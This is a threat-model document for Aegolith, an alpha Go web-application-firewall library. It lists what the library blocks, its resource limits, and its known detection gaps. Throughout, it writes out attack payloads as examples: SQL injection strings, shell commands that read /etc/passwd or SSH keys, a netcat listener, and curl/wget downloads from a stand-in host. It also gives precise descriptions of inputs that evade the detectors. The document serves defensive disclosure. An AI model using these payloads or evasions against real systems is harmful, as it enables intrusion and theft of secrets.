# Threat model

Aegolith sits inside a Go JSON API and reads requests written by strangers. This document says what it is meant to stop, what it does not try to stop, and where it is known to be weak. It is deliberately blunt: a firewall library that overstates itself is worse than none.

It describes the code on `main` (the `v0.1.0-alpha.4` changes included). Aegolith is alpha; run it in monitor mode first.

Found a hole in any of this? Please report it privately: see [SECURITY.md](../SECURITY.md). A false positive or a missed attack that is not a security problem in Aegolith itself is a normal issue (use the templates).

## What Aegolith must never do

1. **Block a real customer.** A false positive is worse than a missed probe the backend would 404 anyway. Rules are tuned for the first and pay for it in recall (see [Known gaps](#known-gaps-and-trade-offs)).
2. **Add milliseconds.** The budget is tens of microseconds per typical request. A feature that costs more is off by default or out.
3. **Crash the host.** No panic escapes the middleware. An internal error follows `FailOpen`: allow by default, block if you turn it off.
4. **Log what it should not.** Snippets in a decision are redacted and at most 64 bytes; full request values are never logged.

## What it protects against

Aegolith inspects the request (method, path, query, headers it knows how to read, cookies and the body) and reports or blocks:

| Class | Rules | What it looks for |
|---|---|---|
| SQL injection, XSS | `AEG-SQLI-001`, `AEG-XSS-001` | libinjection on every free-text value, plus a check for stacked statements that copy to or from a program |
| OS command injection | `AEG-CMDI-001` | a shell operator followed by a command used as a shell is used, an absolute system path, reverse-shell and Shellshock markers |
| Code injection | `AEG-CODEI-001`, `-002` | PHP open tags, eval of base64, Node `child_process`, Java serialized objects |
| LDAP, template, JNDI, CRLF injection | `AEG-LDAP-001`, `AEG-SSTI-001`, `AEG-JNDI-001`, `AEG-CRLF-001` | filter breakers, code in template expressions, Log4Shell lookups (with nested obfuscation), header injection in values |
| File and URL abuse | `AEG-LFI-*`, `AEG-RFI-001`, `AEG-SSRF-*`, `AEG-XXE-001` | traversal and system files, wrapper schemes, metadata and internal hosts, DOCTYPE entities (only when XML is allowed) |
| NoSQL and prototype pollution | `AEG-NOSQL-*`, `AEG-PPOLL-001` | operator keys in JSON and query strings, `__proto__`, `constructor`, `prototype` (JSON keys; bracket and dot paths in query and form keys) |
| Reconnaissance | `AEG-SCANNER-*`, `AEG-SESSION-001` | scanner user agents, well-known probe paths and backup files, session ids in URLs |
| Protocol abuse | `AEG-PROTO-*` | methods, content types, CR/LF/NUL, encoded and double-encoded traversal, request-smuggling header combinations |
| Wrong shape | `AEG-SCHEMA-*`, `AEG-ROUTE-001` | with route policies: a value that does not match its declared type, an undeclared field, an unknown route |

Route policies make the strongest guarantee: a value that validates as a `uuid`, `uuid_lenient`, `int`, `number`, `bool`, `enum` or `phone` cannot carry an injection, so it is not scanned and cannot false-positive. The rule table in the [README](../README.md#rules) lists every rule and its default action.

## What it does not protect against

These are out of scope by design, not bugs. Put the right tool in front of or beside Aegolith.

- **Volumetric DDoS.** It runs in the application process after the connection is accepted. Use a network or edge service.
- **Rate abuse and credential stuffing.** There is no rate limiting, IP reputation or bot challenge.
- **Business-logic flaws.** Buying a negative quantity that the type allows, race conditions, price tampering the schema permits.
- **Authorization bugs.** Aegolith does not know who the caller is or what they may touch (IDOR, missing checks).
- **Attacks hidden in fields declared with the wrong type.** A field you declare `uuid` is trusted to be a UUID. If you declare a free-text field `string` or `enum` with a loose `pattern`, the guarantee is only as good as the declaration. A `string` field is still scanned (defence in depth), but a pattern such as `.*` buys nothing.
- **Lenient UUID declared where the handler is strict, or the reverse.** `uuid_lenient` accepts non-canonical encodings of an id (32 hex digits, `{...}`, `urn:uuid:`), which only makes sense for ids the application itself parses that leniently (for example with Go's `github.com/google/uuid` `Parse`). Every accepted form is still made only of hex digits, `-`, `{`, `}` and the prefix letters, so it cannot carry an injection, but a handler that does its own strict check or compares the raw string would see a value Aegolith let through and the application rejects or mis-handles. Use `uuid_lenient` only where the handler uses a lenient parser; keep `uuid` everywhere else. Declaring `uuid` on a lenient handler is the opposite mistake: a false positive on ids the application accepts.
- **Response-side leaks.** Responses are never inspected.
- **Anything the backend does after decoding in a way Aegolith cannot see.** Aegolith inspects the bytes it is given. A handler that decodes the raw body itself (see Content-Encoding below) can see data Aegolith did not.
- **A compromised host or dependency.** It is a library in your process, not a sandbox.

### Fail-open trade-off

`FailOpen` defaults to true: if inspection hits an internal error, the request is allowed and `Decision.Err` is set. The reasoning is that an availability bug in a security layer must not take the API down. The cost is that anyone who can trigger an internal error can bypass inspection for that request. Set `fail_open` to false to invert it (blocked, 5xx-visible) if you prefer that risk. The decision hook is told either way; alert on `Err`.

## Who controls what

| Input | Controlled by | Trusted? |
|---|---|---|
| Method, path, query, headers, cookies, body | The client | No |
| `Config` (routes, exclusions, rule actions, limits) | The operator | Yes |
| The JSON config file | The operator | Yes (parsed strictly: unknown keys and trailing data are errors) |
| The decision hook and block handler | The operator | Yes |
| Rule IDs and rule logic | This repository | Yes |

## Resource bounds

A WAF library is itself a target for resource exhaustion. What is bounded, and what is not:

- **Per value:** a value longer than `MaxValueLen` (default 8 KiB, rounded down to an even number, minimum 2) is reported (`AEG-PROTO-011`, monitor) and scanned in overlapping windows that start every `MaxValueLen/2` bytes. Every byte is scanned at most twice, and an attack shorter than half a window always lies wholly inside one window, so padding cannot push it out of sight.
- **Per request:** every window is charged against a scan budget of `8 * (MaxBodyBytes + 256 KiB) + 64 KiB` bytes. The factor covers the worst expansion of a body (each invalid UTF-8 byte in a JSON string becomes U+FFFD, one byte to three, doubled by window overlap, plus a raw rescan after malformed JSON). A request whose body is within `MaxBodyBytes` and whose other inputs total at most 256 KiB cannot exhaust it.
- **Body:** at most `2 * MaxBodyBytes` of a body is inspected by the engine. The net/http adapter hands it `MaxBodyBytes + 1` bytes; the Fiber adapter hands it up to `2 * MaxBodyBytes + 1` bytes in every mode (in enforce mode `AEG-PROTO-003` stops the inspection first). A JSON or multipart body cut short only by these caps does not raise `AEG-PROTO-020`. A body over `MaxBodyBytes` raises `AEG-PROTO-003`, which blocks by default. **Everything past what the adapter hands over is not inspected**: past `MaxBodyBytes` with the net/http adapter, past `2 * MaxBodyBytes` with the Fiber adapter. So if you set that rule to monitor, an attacker can pad a body past that point and put the attack after the padding. See [Body over the limit](#body-over-the-limit-padding) below.
- **Structure:** JSON depth (`MaxDepth`, default 32), field count (`MaxFields`, default 1,000: reported once as `AEG-PROTO-010`, the walk continues field by field under the budget), path length (key segments are capped at 256 bytes, whole paths at 1 KiB).
- **Detectors** are linear in the length of the value; the route matcher and the validators are linear; user `pattern`s run on Go's RE2 engine, so they cannot backtrack catastrophically.

The honest worst case, which this release keeps on purpose (the budget is never shrunk to buy speed, because a smaller budget would stop scanning legitimate-sized requests early): an adversarial 1 MiB body, for example repeated invalid UTF-8 plus `<`, can cost roughly 0.5 to 0.8 s of CPU and about 128 MB of allocation, about 93% of it inside libinjection-go. It is bounded, not cheap. Requests over `MaxBodyBytes`, or non-body inputs (URL and query, cookies, headers) over 256 KiB, can exhaust the budget; the engine then raises `AEG-PROTO-011` (monitor) and stops scanning, so the rest of that request is not inspected. Servers pre-empt most of the non-body case (net/http caps headers at 1 MiB by default, fasthttp uses small buffers).

Knobs: `limits.max_body_bytes`, `limits.max_value_len`, `limits.max_fields`, `limits.max_depth`. **Front the service with a body size limit** (a reverse proxy or `http.MaxBytesReader` / Fiber's `BodyLimit`) set to the largest request you accept. Aegolith's limits bound its own work; they are not a substitute for yours.

## Known gaps and trade-offs

Each item says what is missed and why. Most are the price of the first ground rule: never block a real customer. If one of these matters to you, say so in an issue; for several there is a stricter variant we could offer as an option.

### Body over the limit (padding)

Only the first `MaxBodyBytes + 1` bytes of a body reach the engine (default 1 MiB) through the net/http adapter; the Fiber adapter hands over up to `2 * MaxBodyBytes + 1` bytes, so when `AEG-PROTO-003` does not block the attack must sit past `2 * MaxBodyBytes` to go unseen there (net/http still stops at `MaxBodyBytes + 1`). `AEG-PROTO-003`, raised for a longer body, defaults to **block**, so a body such as `{"pad":"<1 MiB of a>","q":"1' OR '1'='1"}` is refused in enforce mode. (In monitor mode it is only reported, like every other rule.)

The gap reopens if you set `"rule_actions": {"AEG-PROTO-003": "monitor"}` (or `allow`), or add an exclusion that covers `AEG-PROTO-003`, for example to accept large multipart uploads: the part past the limit is then not inspected and the handler sees the attack. net/http has no body limit of its own, and Fiber's default `BodyLimit` (4 MiB) is above Aegolith's 1 MiB, so neither server closes it for you. Whatever the rule's action, cap the request body at or below `limits.max_body_bytes` in the server: `http.MaxBytesReader` (net/http), `fiber.Config{BodyLimit: ...}` (Fiber), or the reverse proxy. If you accept larger bodies, raise `max_body_bytes` rather than monitoring the rule.

### Routes Aegolith does not match

A request that matches no declared route is handled as an unknown route (`AEG-ROUTE-001`, monitor by default) and every input is scanned untyped. The attack detectors still run, but the route's typed fields and its `unknown_fields` action do not. So any path variant that the server routes to a handler but Aegolith does not match escapes the route policy:

- **Letter case.** Fiber routes case-insensitively by default (`/API/v1/cart` reaches the `/api/v1/cart` handler). The Fiber adapter detects this (`fiber.Config.CaseSensitive` false) and matches literal route segments case-insensitively for each request. For any other case-insensitive router, set `case_insensitive_routes: true`. net/http's `ServeMux`, chi and gorilla are case-sensitive.
- **Percent-encoded literals.** Routes are matched on the raw path, so `/api/v1/%63art` is not `/api/v1/cart`. Routers that decode the path before routing (Fiber with `UnescapePath`) would route it.

Once your route list covers the API, set `unknown_route: block` so these variants are refused rather than reported.

### Recall traded for fewer false positives

- **Recall given up in the last detector changes.** Two shapes that look like attacks are allowed: `x & cat /flag.txt` (a one-segment root file after a prose `&` with no flag; the same command after `;`, `&&`, `|` or a newline is blocked) and `Location:evil.com` in a value (a `Location` header injection with a bare host; Go servers refuse CR and LF in header values anyway). Both are detailed below.
- **Command injection after prose.** After a lone ` & ` in prose, or a two-word prose `; `, the CmdI detector does not flag some bare shapes: `x & id`, `x & ls`, `x & cat /flag` or `x & cat /flag.txt` with no flag, `see you; id`, `see you; ls`, `see you; sh`, `; chmod +x` or `; chmod 755` with no file, and `| type /a`. They are indistinguishable from `Bring passport & id`, `dog & cat /dog-food`, `Dog & cat /pet-food.html`, `Notes; chmod 755` and `Pack of 2 | type /a`. A real flag after the ` & ` restores the full rules, and shell-only operators (`&&`, `|`, a backtick, `$(`) are always checked; from alpha.6 a `$(` or `$((` substitution of any word is flagged (see "Changes in alpha.6"). Single-segment root paths (`/flag`, `/flag.txt`) are not treated as paths in these positions; a system path, a deeper path and a root dot-file (`/.env`) are.
- **Command injection and line breaks.** A literal line break before a bare command (`Notes:\nls`, `Baby care:\nsleep 8`) reads as a line of prose in JSON and form bodies, where it comes from a textarea or a multi-line note. A query string cannot carry a raw line break, so in a query value every line break arrived percent-encoded and the ordinary rule applies: `?q=x%0aid` is blocked, and so is a query value of `Notes:` then a line `ls` (from alpha.6, a line of two or more words of prose before the break reads as prose there too: `Dear team` then `id`). `sleep` counts only with a whole number of seconds and nothing after it but an operator (`; sleep 10`); `rest; sleep well`, `Tea & sleep 8 hours`, and `Kids & sleep 8`, `Long day; sleep 8` or `Mon; sleep 8` (a plain word or number, a prose-like operator, no operator after the number) are clear. A command word split by paired quotes or backslashes (`;w'h'o'am'i`, `;c\at`) is matched after quote removal; an unpaired apostrophe (`i'd`, `it's`) is prose, not quoting.
- **Command injection false positives.** After a prose `&`, a common English word after a dash (`-me`, `-you`, `-the`) or a long one (`-lovers`) is read as a word, not a flag, so `Delivery & ping -me 10.0.0.1` and `Tea & cat -lovers /club` are clear. A four-letter word after a dash is still read as a flag cluster (it cannot be told from `-ltrh`), so `Tea & cat -cozy /club` is still blocked. The corpus has none of these shapes.
- **XSS script URL false positives.** The same rule flags some prose after a `javascript:` label: `javascript: yes=no; maybe (later)` is blocked, because `maybe (` after `; ` is read as a call with a blank before `(`. The corpus has none of these shapes; exclude `AEG-XSS-*` on the field if your users write such text.
- **XSS script URLs.** `javascript:` followed by `key=value` is read as code when the key is a browser global given a value that is not an inert word (`location=name`), or when something after the `=` is code-shaped: a backtick, a `(` directly after a name, `)` or `]`, a `;` directly followed by more text, or a later statement after `; ` or `, ` that is itself code (a dotted name assigned, called or indexed, a browser global assigned, or after `; ` a call with a blank before `(`), so `javascript: a=1; location=name` is caught. A browser global only on the value side (`javascript: a=location`) does not count. Prose such as `javascript: a=1; b=2`, `JavaScript: level=beginner (2 weeks)` and `javascript: name=Ali` is clear; prose written without blanks (`javascript: a=1;b=2`, `javascript: level=f(x)`) is still flagged. HTML whitespace references inside the scheme or after it (`&#9;`, `&#x0A;`, `&Tab;`, `&NewLine;`) are decoded; other references (`javascript&colon;alert(1)`) are not. libinjection itself misses `1' -- ` with a trailing space.
- **Detector coverage is narrow on purpose** ("not a CRS clone"): `${IFS}` evasion, a schemeless `curl host`, `sleep` with a unit (`sleep 5s`), `python3` one-liners and a host-only `nc host` are missed by CmdI. For JNDI the Log4j `$${` escape is not modelled, and more than 8 nested `${` counts as a hit. CRLF checks only 9 named response headers; `Location` counts only when its value starts with `/`, `\` or a URL scheme (`Location:evil.com` is missed), and `Refresh` only as `<seconds>;url=`. LFI misses the filter-evasion forms `....//`, `..././` and `/..;/`. SSRF misses the IPv4-compatible `[::127.0.0.1]` and NAT64 `64:ff9b::` forms, and reads all-digit hosts the inet_aton way. The dot probe names and `wp-login.php` match as a prefix of any path segment, and `actuator` below the first segment with a known endpoint after it (see the alpha.4 items below), and the `~` backup-file suffix flags `/users/~`. `Transfer-Encoding` is compared exactly, so `Chunked` is blocked (which is the safe side).
- **NoSQL operators.** Query-string and form keys match a known MongoDB operator, bracketed anywhere in the key (`email[$ne]`, `a[$or][0][b]`, `[$elemMatch]`) or as the key itself (`$where`, `$in[]`). The list is `$eq $ne $gt $gte $lt $lte $in $nin $or $and $nor $not $exists $type $regex $where $expr $mod $text $jsonSchema $size $elemMatch $all`, matched case-sensitively as MongoDB does, so currency-style keys such as `amount[$USD]` are not flagged; an operator outside that list is not caught. An operator written inside a value is inert text and is not matched (corpus miss 2). JSON keys are different: any key starting with `$` is a hit, so a legitimate `$schema` or `$ref` key is flagged. If your API takes JSON Schema documents, exclude `AEG-NOSQL-001` on that route and field.
- **Keys and cookie names.** JSON keys and query or form keys are checked by the key rules (`JSONKey`, `QueryKey`, `Session`) and by the SQL injection detector (`AEG-SQLI-001`, at most `MaxValueLen` bytes of a key, charged to the scan budget; the match carries the key as its field name and no snippet). A query or form pair whose key ends with a quote and whose value starts with the same quote is also checked as one decoded `key=value` string, because an unencoded `=` between two quoted operands (`?1' OR '1'='1=x`) splits the injection across key and value. A key longer than `MaxValueLen` is checked on its first `MaxValueLen` bytes only and raises `AEG-PROTO-011` (monitor) on its field. The other text detectors (XSS, command injection, traversal and so on) do not run on keys. `QueryKey` reports prototype pollution in bracket or dot form when a segment is `__proto__` or a `constructor` segment is followed by `prototype`; a lone `constructor` or `prototype` query or form key (`filter[constructor]`, `item[prototype]`) is an ordinary field and is not flagged. Cookie names are not checked by any rule; only cookie values are scanned. That matters for a backend that uses a dynamic column or sort key taken from a cookie name.
- **Raw rescan after malformed JSON, and data after the first value.** When a body fails to parse, the raw bytes are rescanned in windows, using libinjection's quote-state context, so quote-parity padding can evade that rescan. A body with data after a complete first JSON value is such a body: in `{"a":"x"}'{"q":"1' OR '1'='1"}` the parse fails (`AEG-PROTO-020`, monitor) and the stray `'` flips the quote state the rescan sees, so the second object is allowed. An attack inside the first value is still caught (`{"q":"1' OR '1'='1"}'` blocks). No standard-library Go decoder acts on the trailing value: `json.Unmarshal` rejects the body, `json.Decoder.Decode` returns only the first value and a second `Decode` fails on the `'`. It matters only for a backend whose parser accepts such a body and reads past the first value.
- **JSON charsets.** The content-type check ignores the `charset` parameter, so `application/json; charset=utf-16` or `charset=iso-8859-1` is accepted. This fails safe: the body is parsed as UTF-8, so UTF-16 text does not parse (`AEG-PROTO-020`) and its NUL bytes are blocked (`AEG-LFI-001`), and ASCII-compatible charsets are inspected as the bytes they are. Go's `encoding/json` cannot read UTF-16 either.
- **Multipart quoted-printable.** A malformed quoted-printable part aborts the multipart parse (`AEG-PROTO-020` only, monitor). The parts read before the failure are inspected. This mirrors Go backends, which also stop there.

### Detector coverage added in alpha.4, and what it costs

alpha.4 closed eight gaps found by probing a production API. Each fix has a recall limit and a false-positive cost; both are listed here and have unit tests.

- **SQL injection after leading words or padding.** The detector now also reads a value from each SQL keyword that starts a word (`union`, `select`, `or`, `and`, `exec`, `waitfor`, ...), so `look for 1 UNION SELECT password FROM users--` is caught. The first 8 and the last 8 qualifying candidate starts are tried (a `union` followed by `SELECT`, `ALL` or `DISTINCT`, or another keyword with SQL syntax after it), each read for at most 128 bytes, so **a payload with more than 8 qualifying non-triggering candidates on both sides (about 250 bytes of keyword padding) can still hide it**. Keywords other than `union` count only when the value ends in a truncating comment (`--`, unclosed `/*`) and real SQL syntax (a comparison with two numbers, two quoted strings or the same name on its sides, a call, a single-quoted word, a final `;`) sits between them, so most prose is clear, but `call 1 or 2=3 --` is flagged (the shape of the probe `1 OR 2=3--`). Separately, and **already present before alpha.4**, libinjection flags numeric tautology prose such as `6-7 or 8` (`?q=6-7+or+8`, fingerprint `1&1`; with an apostrophe before it, as in `children's size=6-7 or 8`, the rest is read as an unterminated string and is clear). alpha.6 clears the bare form (see "Changes in alpha.6" below).
- **Nested script tag.** `<scr<script>ipt>` style input is caught by looking for `<script` followed by `>`, `<` or whitespace anywhere in the value. Prose that contains a literal `<script` at the end of a value (`price <script`) is flagged, but libinjection already flagged that before alpha.4; `<scripts`, `<script.` and `a < script` are clear.
- **Template and expression injection.** Go template actions with a function (`{{printf ...}}`, `{{call ...}}`, `{{index ...}}`, `{{template ...}}` and similar) are caught when the first argument has a call shape (`.`, `"`, `$`, a backtick); a bare `{{ index }}` or `{{ with love }}` is prose. `${...}` was flagged in alpha.4 for number arithmetic with `*` or `+` (`${7*7}`), member access (`${a.b}`) and calls, which made `${order.total}` and `${user.name}` false positives; alpha.5 narrowed that (see "Changes in alpha.5" below). Missed: `${7*'7'}`, `${7-7}`, Go actions outside the list (`if`, `eq`, `len`, ...) and actions whose first argument is not call-shaped; `${a:b}` is treated as a lookup, not an expression, and left to the JNDI rule.
- **Command injection.** `sleep N` (whole seconds, then end or an operator) is caught after an operator (`; sleep 10`, `| sleep 10 |`). In alpha.4 a one-word prefix before the operator was also caught, so `Gate 2; sleep 10` and `Mon; sleep 8` were false positives; alpha.5 fixed that (see "Changes in alpha.5" below). Paired quotes and backslashes inside a command word are removed before matching (`;w'h'o'am'i`, `;c\at /etc/passwd`), which also flags prose like `Passport; "id"` and `Tea & 'cat' /etc/passwd`. **Query values**: a query string cannot carry a raw line break, so every line break in a decoded query value was percent-encoded and the strict "a line of prose" reading is off there: `?q=x%0aid` is blocked, and so is a query value with a real line break and a bare command word after a one-word line (`Notes:` newline `ls`); from alpha.6 a line of two or more words of prose before the break makes it prose (see "Changes in alpha.6"). In JSON and form bodies the strict rule stays, so a **form body `x%0aid` is not detected** (the field comes from a textarea; the same bare command after a line break reads as prose).
- **Scanner probes.** The dot names (`.env`, `.git/`, `.aws/`, `.ssh/`) and `wp-login.php` match at the start of **any path segment**, so `/api/v1/.env` and `/x/.env.local` are flagged `AEG-SCANNER-002` (block); `/orders/.environment` stays clear. `actuator` below the first segment counts only when a known Spring Boot endpoint follows it (`env`, `heapdump`, `mappings`, `configprops`, `beans`, `threaddump`, `loggers`, `jolokia`, `gateway`, `health`, `info`, `metrics`, `prometheus`): `/api/v1/actuator/env` hits, `/api/v1/devices/actuator/5` is clear, and a customer route such as `/api/v1/devices/actuator/health` must be excluded. `wp-admin`, `phpmyadmin` and `server-status` match at the path start only (`/api/server-status` is clear); a `.php` file under them still hits `AEG-SCANNER-003`. The user agents `wfuzz`, `feroxbuster`, `Fuzz Faster U Fool` and the exact word `Hydra` (whole word, so `Hydration/1.0` is clear) are scanner agents.
- **Key names.** SQL injection is now also checked on JSON, query, form and multipart key names (see "Keys and cookie names"). A plain identifier key skips the check. Query and form keys with a `__proto__` segment, or `constructor` followed by `prototype`, raise `AEG-PPOLL-001`; a lone `constructor` or `prototype` key is an ordinary field and is **not** flagged (JSON keys are unchanged: exact `constructor` and `prototype` still hit). A key longer than `MaxValueLen` raises `AEG-PROTO-011`. A key with an apostrophe and a value is also checked as one string; prose such as `children's size=6-7 or 8` in a key is clear, but the same words in a value are the pre-existing libinjection false positive above.
- **Body over the cap in monitor mode (Fiber adapter).** The adapter copies up to `2 * MaxBodyBytes + 1` bytes of every body (was `MaxBodyBytes + 1` in enforce mode), so monitor mode and `AEG-PROTO-003` set to monitor now inspect up to twice the limit. In enforce mode with `AEG-PROTO-003` blocking, the decision is unchanged but one more memory copy of at most `MaxBodyBytes` is made for an over-cap body that Fiber already holds. The net/http adapter (`httpwaf`) still copies only `MaxBodyBytes + 1`. A JSON or multipart body cut only by these caps no longer raises `AEG-PROTO-020`; a gzip body in enforce mode still does (noise, see Content-Encoding above).
- **Known unsupported (not attempted).** MySQL-only syntax, fullwidth, `%u` and overlong encodings, DNS-based SSRF hosts such as nip.io names that resolve to an internal address, XPath injection (corpus miss 3), and Python `__import__`.

### Changes in alpha.5, and what they cost

alpha.5 removed two alpha.4 false positives found in a production test and closed one missed shape. Each has unit tests and corpus cases.

- **`sleep N` after one word of prose (CmdI).** `Mon; sleep 8`, `Gate 2; sleep 10`, `Good night; sleep 8`, `Tired & sleep 8` and `Café; sleep 8` are clear. They are still blocked when: the operator leads (`; sleep 10`, `;sleep 10`), the operator is `|` or `&&` (`x| sleep 10 |`, `a && sleep 10`), there is no blank after the `;` (`1;sleep 5`, `Mon;sleep 8`), any operator follows the number (`Mon; sleep 8 &`), the token before `; ` is not a plain word or number (`127.0.0.1; sleep 10`, `file.txt; sleep 10`, `a=1; sleep 10`, `x-y; sleep 10`, `/tmp; sleep 10`), or the `;` is still percent-encoded after transport decoding (`Mon%3B%20sleep%208`: a double-encoded `;` is a scanner, not a person). **Missed:** a single plain token, then `; `, then `sleep N` at the end of the value (`x; sleep 10`, `1; sleep 5`, `x;  sleep 10`) is no longer caught; it cannot be told from `Mon; sleep 8`. (alpha.6 catches a lone letter or number again; see "Changes in alpha.6".) Other commands after a one-word prefix are unchanged (`Mon; id`, `Passport; "id"` are still flagged).
- **`${...}` expressions (SSTI).** `${order.total}`, `${user.name}`, `${file.txt}`, `${price}`, `${a.b.c}`, `${order.key}`, `${student.class}` and `Your total is ${order.total} today` are clear. A `${...}` is flagged for arithmetic (`${7*7}`), a sensitive name anywhere in it (`password`, `pass`, `pwd`, `secret`, `token`, `credentials`, `apikey`, `env`, `getclass`, `forname`, `runtime`, `system`, `classloader`, `execute`, `eval`, `session`, `request`, ...; the set is `elSensitive` in `internal/detect/injection.go`, matched case-insensitively), a call with a string-literal argument (`${ex("id")}`), a `__`, `?new` or `?api`, or a string-literal receiver (`${"id".execute()}`). **False-positive costs:** `${t('cart.title')}` (a translation call with a string argument) and `${bus.pass}` are flagged; exclude `AEG-SSTI-001` on fields that carry such placeholder text. **Missed:** member access or calls on non-sensitive names (`${user.getName()}`, `${order.getTotal()}`, `${a.b()}`) are no longer detected. `#{order.total}` is unchanged and still flagged as `AEG-SSTI-001` (the `#{...}` rule). `${jndi:...}` stays with the JNDI rule.
- **Java serialized object in a path (CodeI, G1b).** A base64 object (`rO0ABX...`) after a `/` in the path of an unknown route, or in the rest of a wildcard route, is `AEG-CODEI-002`. After a `/` the rule needs `rO0ABX` (the type-code byte of a real stream), not `rO0AB`, so a long legitimate path segment is clear; `/rO0ABQ==` with no type code is not flagged because it carries no object.
- **Unchanged pre-existing false positive.** libinjection flags numeric tautology prose such as `6-7 or 8` (see alpha.4 above). It is still there (fixed in alpha.6).

### Changes in alpha.6, and what they cost

alpha.6 removes false positives, and adds recall for missed probe families, found by an external validation run on public payload lists and benign text. Each has unit tests and corpus cases.

- **Percent signs and bare number phrases (SQLi).** libinjection reads `%` as the modulo operator, so product and ingredient text of the shape `Word N% (word)` (`Sale 20% (today only)`, `Cotton 95% (organic)`, `Céréales 93 % (farine de BLÉ 79,4 %, sucre)`) and `80% ACRYLIC AND 20% WOOL` were blocked; so was a bare size `6-7 or 8`. They are clear now. A libinjection hit on a value with a `%` is dropped only when its fingerprint has no keyword, function, string, comment or `;` token; every `%` reads as a percent sign (it ends the value, or comes before `,`, `.`, `)`, or a word or `(word` after blanks: a digit after it, as in `1%1`, `1 % 1` or `1%(1)`, or a word glued to it, as in `1%x`, is modulo); the value has no `like`, `rlike`, `regexp`, `xor`, `div`, `mod`, `between`, `sounds` or `null` word, no `--`, `/*`, `;`, double quote, backtick or single quote other than an apostrophe inside a word, and no SQL syntax (`1=1`, `2>1`, `1<>2`, `x(`, a quoted word); and libinjection does not flag it with every `%` read as a blank. A `1&1` hit is dropped only when the whole value is numbers or ranges that start with a digit (`6-7`, `1.5-2`, `8`) joined by `or` or `and`, with at least one range or decimal. Still blocked: `5 % (select 1)`, `1%1 or 1`, `1%1 or 1=1`, `1%(1) or 1 like 1`, `1%1 xor 1`, `80% cotton or 1=1`, `1 or 1=1`, `99 or 1 or 1`, `-1 or 1`, `6-7 or 8=8`, `6-7 || 8`, `6-7 or 8--`. **Missed:** a comparison-free tautology that contains a range or decimal (`1-1 or 1`, `6-7 or 8 or 1`), or that follows `N% (word)` with plain `or`/`and`, `not` or `in` (`9% (a) or 1`, `9% (a) or not 0`, `9% (a) or 1 in (1)`). They have the shape of `6-7 or 8` and `Sale 20% (today only)`, and a typed field still rejects them through its schema. `1 or 1`, `1 and 0` and `0 or 1` are not flagged by libinjection at all, before or after this change. **Still flagged:** a spaced range (`6 - 7 or 8`).
- **Command injection: User-Agent locale tokens, dashed words, markdown inline code, prose lines in a query, and `x; sleep 10`.**
  - *User-Agent comments.* In a value that starts with a product token (`Name/1.0` and a blank) a `"; "` inside a `(...)` comment after it separates tokens, and `id` there is the Indonesian locale tag: `Mozilla/5.0 (Linux; U; Android 4.4.2; id; ...)` and `(BlackBerry; U; BlackBerry 9220; id)` are clear. Only a two-letter bare command (`id`, `ls`, `sh`) with no flag is excused. The comment must be closed (a `)` after the `;`), and the rule is structural: any value that starts with a product token gets it, not only the `User-Agent` header. Still blocked: `(Linux; id -u)`, `(Linux; whoami)`, `(Linux; cat /etc/passwd)`, ``(Linux; `id`)``, `(Linux; $(id))`, `(Linux;id)` (no blank), `Mozilla/5.0 (Linux) ; id` (outside the comment), `(Linux%3B id)`, an unclosed comment (`x/1 (; id`, `Mozilla/5.0 (Linux 4.4.2; id`), a value with no product token (`(Linux; id)`), and Shellshock (`() { :;}; /bin/id`). **Missed:** a two-letter bare command after `; ` in a closed comment of a UA-shaped value: `Mozilla/5.0 (x; id)`, `Mozilla/5.0 (x; id; ls)`, `a/1 (b; sh)`.
  - *Words after a dash.* After a lone ` & `, a four-letter lower-case word with two vowels counting `y` (`-cozy`, `-cute`) reads as a word, as five-letter words already did, so `Tea & cat -cozy /club` is clear. A system path, a deeper path, a dot-file, a home path or a variable still counts (`Tea & cat -cozy /etc/passwd`, `x & cat -cozy ~/.ssh/id_rsa`). **Missed:** a four-letter two-vowel word after the dash, then a one-segment root path: `x & cat -cozy /flag`, `x & cat -easy /flag.txt`.
  - *Markdown inline code.* In a JSON, form, header or cookie value, a backtick is not read as command substitution when it opens a single-backtick span in a sentence: a blank before it with a letter, a non-ASCII character or sentence punctuation (`. , : ! ? ) " '`) before the blank, the closing backtick on the same line, and sentence text after it (punctuation, or a blank and a word). The span must also only name a command: a word, then only flags made of letters and `-`, never `-c` or `-e`, and no flag at all after `sh`, `bash`, `python`, `perl`, `nc`, `ncat` or `netcat`. ``Use `ls` to list files``, ``Se også: `id`.``, ``On LoongArch, `uname -m` returns `loongarch64` `` and ``see `id --user --name` for details`` are clear. Only the opening backtick is excused: an operator inside the span is still scanned (``Use `curl http://x | sh` now`` is blocked). Still blocked: any argument, number, path, URL or quote in the span (``a `sleep 10` b``, ``a `curl -o /tmp/x http://e.example/x` b``, ``Run `wget http://e.example/x -O /tmp/x` now``, ``a `bash -c 'id'` b``, ``x `cat /etc/passwd` y``, ``a `ls /tmp` b``, ``a `rm -rf /` b``, ``a `nc -lvp 4444` b``, ``a `w'h'o'am'i` b``, ``terminal `/dev/tty5`:``), `` `id` `` alone, ``x`id` ``, ``x; `id` ``, ``x = `id` now``, ``Name `id` `` (nothing after the span), ``Use `ls` id``, a span that arrived as `%60`, and every backtick in a **query value**, where markdown is not expected. **Missed:** in a JSON, form, header or cookie value (a Referer or cookie included), a prose span holding a command word with letter-only flags: ``a `id` b``, ``x: `ls`.``, ``a `whoami` b``, ``a `uname -a` b``, ``a `ls -la` b``, ``a `sh` b``, ``Note: `id` here``. Still flagged (false positives that remain): a span at the start or the end of the value (`` `ls` 的現代替代品``, ``See also: `uname` ``), a span right after `(` (``(`sh`)``), and fenced code blocks.
  - *Line breaks in a query value.* A query value's line breaks arrived percent-encoded, so the ordinary rule applies, except when the line before the break is prose: two or more words, no shell operator or `$ ( ) < > { } = \`, ending in a letter, a non-ASCII character or `. , : ! ?`. Then `id` or `ls` alone on the next line is a word: `?q=Dear%20team%0aid` is clear. Every other command keeps the ordinary rule after a prose line (`foo bar` newline `sleep 10`, `whoami`, `uname` or `sh` is blocked). Still blocked: `?q=x%0aid`, `?q=127.0.0.1%0aid`, `?q=x;%0aid`, `?q=a=b%20c%0aid`, a flag or an operand on the next line (`Dear team` newline `id -u`, `cat /etc/passwd`), and a line break that is still encoded after transport decoding (`Dear team%0aid` as the decoded value). **Missed:** a query value of two or more words of prose, then a line break, then `id` or `ls` alone (`?q=foo%20bar%0aid`, `?q=foo%20bar%0aid%0a`, `?q=foo%20bar%0als`).
